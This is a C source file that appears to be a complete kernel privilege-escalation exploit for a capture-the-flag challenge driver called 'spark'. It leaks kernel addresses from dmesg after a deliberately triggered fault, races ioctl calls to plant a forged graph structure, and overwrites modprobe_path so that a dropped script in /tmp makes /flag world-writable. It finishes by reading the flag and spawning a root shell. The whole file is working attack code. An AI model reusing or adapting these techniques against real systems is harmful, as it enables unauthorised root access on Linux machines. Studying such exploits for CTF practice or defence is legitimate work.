#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <linux/spark.h>

#define DEV "/dev/node"
#define N 1024
static int fds[N];

static unsigned long long k_heap, k_data, k_stack;

static void *call_finalize(void *arg) {
  int fd = (int) arg;

  ioctl(fd, SPARK_FINALIZE);
  return NULL;
}

#define FAKE_GRAPH_AT ((void*) 0x1337000)
struct spark_graph {
  size_t total;
  size_t capacity;
  void **nodes;
};

struct list_head {
  struct list_head *next, *prev;
};
struct mutex { size_t pad[4]; };
typedef int refcount_t;
struct spark_node {
  size_t id;
  refcount_t refcount;
  struct mutex state_lock;
  int state;
  struct mutex nb_lock;
  size_t nnb;
  struct list_head nb;
  size_t idx; /* set when finalizing */
  struct spark_graph *graph; /* only used by the graph leader */
};
struct spark_node_link {
  struct list_head head;
  struct spark_node *node;
  size_t weight;
};

static int forged_fd;

#define FAKE_GRAPH_SIZE 0x80000
static void forge_graph() {
  size_t modprobe_path = k_data - 0x6508;
  size_t dis_at = (k_heap & 0xfffffffff0000000ull) | 0xdc00000u;
  printf("Predict dis array @ 0x%lx, modprobe_path @ 0x%lx\n", dis_at, modprobe_path);
  void *ptr = mmap(FAKE_GRAPH_AT, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  struct spark_graph *graph = ptr;
  struct spark_node **nodes = graph + 1;
  struct spark_node *x1 = &nodes[2], *x2;
  struct spark_node_link *l1; /* connect x1 -> x2 */
  x2 = x1 + 1;
  nodes[0] = x1;
  nodes[1] = x2;
  x1->idx = 0;
  x2->idx = (modprobe_path - dis_at) / 8;
  l1 = x2 + 1;
  l1->weight = 0;
  strcpy(&l1->weight, "/tmp/a");
  l1->node = x2;
  x1->nb.next = x1->nb.prev = &l1->head;
  l1->head.next = l1->head.prev = &x1->nb;

  assert(sizeof(**nodes) == 0x80);
  graph->total = FAKE_GRAPH_SIZE;
  graph->nodes = nodes;
}

static void attack() {
  // any two FDs with idx = 0 and 1
  struct spark_ioctl_query qry = {
    .fd1 = fds[0],
    .fd2 = fds[1],
  };
  ioctl(forged_fd, SPARK_QUERY, &qry);
  system("cat /proc/sys/kernel/modprobe");
  system("/tmp/fake");
  system("cat /flag");
  system("/bin/sh");
}

static bool prepare_pool_and_hack() {
  // create multiple nodes and see which one's graph is forged
#define PN 200
  static int pool[PN];
  for (int i=0;i<PN;i++) {
    pool[i] = open(DEV, O_RDWR);
    assert(pool[i] >= 0);
    assert(ioctl(pool[i], SPARK_FINALIZE) == 0);
  }
  struct spark_ioctl_query qry = {
    .fd1 = fds[15],
    .fd2 = fds[3],
  };
  ioctl(fds[0], SPARK_QUERY, &qry);
  for (int i = 0; i < PN; i++) {
    struct spark_ioctl_info info;
    ioctl(pool[i], SPARK_INFO, &info);
    if (info.graph_size == FAKE_GRAPH_SIZE) {
      printf("Gotcha! pool[%d] has the forged graph\n", i);
      forged_fd = pool[i];
      return true;
    }
  }
  for (int i = 0; i < PN; i++)
    close(pool[i]);
  return false;
}
/*
 * graph with size 16
 * idx 31
 *                 -- 30 ... 0 (piv)
 *                /                 
 * 0 .... 15 -- nidx (31) -- 32 -- ... -- 128
 */
static bool construct_graph() {
  const int n = 128 + 16;
  for (int i = 0; i < n; i++) {
    fds[i] = open(DEV, O_RDWR);
    assert(fds[i] >= 0);
  }
  const int piv = 16;
  for (int i = 0; i < piv; i++)
    assert(ioctl(fds[i], SPARK_LINK, fds[i + 1]) == 0); // doesn't care weight
  const int nidx = 31;
  ioctl(fds[piv - 1], SPARK_LINK, fds[nidx + piv] | ((unsigned long long)FAKE_GRAPH_AT << 32));

  for (int i = piv; i < n - 1; i++)
    assert(ioctl(fds[i], SPARK_LINK, fds[i + 1]) == 0); // doesn't care weight
  pthread_t pid;
  assert(pthread_create(&pid, NULL, call_finalize, (void*)fds[piv]) == 0);
  usleep(60);
  ioctl(fds[0], SPARK_FINALIZE);
  pthread_join(pid, NULL);

  struct spark_ioctl_info info1, info2;
  assert(ioctl(fds[0], SPARK_INFO, &info1) == 0);
  assert(ioctl(fds[piv], SPARK_INFO, &info2) == 0);
  printf("[0] size=%lu; [%d] size=%lu\n", info1.graph_size, piv, info2.graph_size);
  bool ret = info1.graph_size == piv;

  if (!ret) {
    for (int i = 0; i < n; i++)
      close(fds[i]);
  }
  return ret;
}

static void trigger_gfp() {
  int fd1 = open(DEV, O_RDWR), fd2 = open(DEV, O_RDWR);
  assert(ioctl(fd1, SPARK_LINK, fd2) == 0);
  close(fd2);
  /* may need wait ~usecs here but close() seems always fast enough to trigger the bug */
  ioctl(fd1, SPARK_FINALIZE);
}

static void read_addr() {
  float dummy;
  unsigned long long d;
  FILE *f = fopen("/home/spark/leak", "r");
  // [    3.986754] RSP: 0018:ffffac04801f7e00 EFLAGS: 00000286
  // [    3.986786] RAX: 0000000000000000 RBX: ffff9d180be6f280 RCX: ffffffffb5468e68
  fscanf(f, "[ %f] RSP: 0018:%llx EFLAGS: %llx\n", &dummy, &k_stack, &d);
  fscanf(f, "[ %f] RAX: %llx RBX: %llx RCX: %llx", &dummy, &d, &k_heap, &k_data);
  fclose(f);
  printf("kernel stack @ %#llx\n", k_stack);
  printf("kernel heap @ %#llx\n", k_heap);
  printf("kernel data @ %#llx\n", k_data);
}

static void leak() {
  system("/home/spark/exp gfp");
  system("dmesg | grep -E 'RSP|RCX' | head -n 2 > /home/spark/leak");
  read_addr();
}

static void setup() {
  puts("[+] Prepare chmod file.");
  system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/a");
  system("chmod +x /tmp/a");

  puts("[+] Prepare trigger file.");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
  system("chmod +x /tmp/fake");
}

int main(int argc, char *argv[], char *envp[]) {
  if (argc == 2) {
    trigger_gfp();
    return 0;
  }
  leak();
  setup();
  forge_graph();
  while (!construct_graph());
  if (!prepare_pool_and_hack()) {
    puts("Failed..");
    execv("/home/spark/exp", argv);
    exit(1);
  }
  attack();

  scanf("%*c");
  return 0;
}
